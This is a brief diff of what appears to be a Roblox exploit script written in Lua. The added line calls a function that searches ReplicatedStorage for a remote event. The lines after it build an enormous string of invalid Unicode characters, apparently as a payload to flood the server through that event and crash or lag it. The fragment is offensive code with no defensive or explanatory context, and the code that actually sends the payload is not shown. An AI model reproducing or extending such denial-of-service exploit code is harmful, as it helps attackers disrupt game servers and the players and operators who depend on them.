@@ -1128,6 +1128,7 @@ local function FindEvent(parent)
         end
     end
 end
+FindEvent(game.ReplicatedStorage)
 if REvent then
     local bytes = math.huge
     local val = string.rep("򃿿",bytes/4)
